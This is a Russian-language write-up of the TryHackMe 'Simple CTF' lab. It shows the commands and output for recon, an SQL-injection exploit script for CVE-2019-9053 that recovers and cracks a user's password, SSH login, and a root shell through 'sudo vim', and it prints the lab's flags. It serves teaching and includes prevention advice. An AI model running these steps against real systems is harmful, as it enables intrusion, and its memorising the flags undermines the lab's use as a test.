# Simple CTF

**Сложность:** Easy

<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/12ef0b76-8706-47ed-841a-eb7106edc145" />

|  |  |
| --- | --- |
| **Платформа** | TryHackMe |
| **Ссылка** | [https://tryhackme.com/r/room/easyctf](https://tryhackme.com/room/easyctf) |
| **ОС** | Linux |
| **Теги** | `cms-made-simple`, `sqli`, `cve-2019-9053`, `ssh`, `sudo`, `vim` |

## Кратко

Цепочка атаки: сканирование сервисов и анонимный вход на FTP → обнаружение CMS Made Simple (`/simple`) → эксплуатация time-based SQL-инъекции (CVE-2019-9053) для извлечения учётных данных пользователя `mitch` → доступ по SSH на нестандартном порту `2222` → эскалация привилегий до `root` через запуск команд из `sudo vim`.

## 1. Разведка

### Сканирование портов

```bash
nmap -A 10.82.183.41

```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

```

В результате сканирования выявили FTP с разрешённым анонимным входом (порт 21), веб-сервер Apache (порт 80) и SSH на нестандартном порту 2222.

### Перечисление сервисов

**Анализ FTP:**

Подключение под учётной записью `anonymous` позволило скачать файл `ForMitch.txt` из директории `/pub`:

```text
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

```

Из текста файла стало известно имя потенциального пользователя системы — `mitch`.

**Перечисление веб-директорий:**

Перебор директорий с помощью Gobuster обнаружил установку CMS Made Simple по адресу `/simple`:

```bash
gobuster dir -u http://10.82.183.41 -w /usr/share/wordlists/dirb/small.txt -x php

```

```
/simple               (Status: 301) [Size: 313] [--> http://10.82.183.41/simple/]

```

На главной странице `/simple` была определена версия системы — **CMS Made Simple 2.2.8**. В домашней директории пользователя `/home` также был замечен еще один учетный файл пользователя `sunbath`.

## 2. Получение доступа

Версия CMS Made Simple 2.2.8 уязвима к time-based SQL-инъекции (**CVE-2019-9053**). Для извлечения данных из БД использовался публичный скрипт на Python 2 (`46635.py` из SearchSploit):

```bash
python2 46635.py -u http://10.82.183.41/simple --crack -w /usr/share/wordlists/rockyou.txt

```

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret

```

С полученными учетными данными (`mitch:secret`) выполняем подключение по SSH на порт `2222`:

```bash
ssh mitch@10.82.183.41 -p 2222

```

Флаг пользователя находится в домашнем каталоге `/home/mitch/user.txt`.

**Флаг пользователя:** `G00d j0b, keep up!`

## 3. Повышение привилегий

Проверка прав `sudo` для пользователя `mitch`:

```bash
sudo -l

```

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```

Пользователь может запускать `vim` с правами `root` без запроса пароля. Эксплуатация через выполнение системной команды из интерактивного режима `vim` (GTFOBins):

```bash
sudo vim
:!/bin/bash

```

Команда открывает root-оболочку. Флаг читается из файла `/root/root.txt`.

**Флаг root:** `W3ll d0n3. You made it!`

## Выводы

* **Уязвимости:** Устаревшая версия CMS Made Simple, уязвимая к SQLi (CVE-2019-9053), слабое парольное соглашение, избыточные права в `sudoers` (`NOPASSWD` для текстового редактора `vim`).
* **Как предотвратить:** Своевременно обновлять веб-приложения и CMS, использовать стойкие пароли, ограничить или убрать возможность запуска интерактивных бинарников (вроде `vim`, `nano`, `less`) через `sudo` без пароля.
* **Чему научился:** Автоматизированной эксплуатации time-based SQLi (CVE-2019-9053), подбору и хешированию MD5 с солью, а также технике выхода в root-шелл через встроенные вызовы команд в `vim`.

## Использованные инструменты

`nmap`, `gobuster`, `searchsploit`, `python2`, `ftp`, `ssh`, `vim`
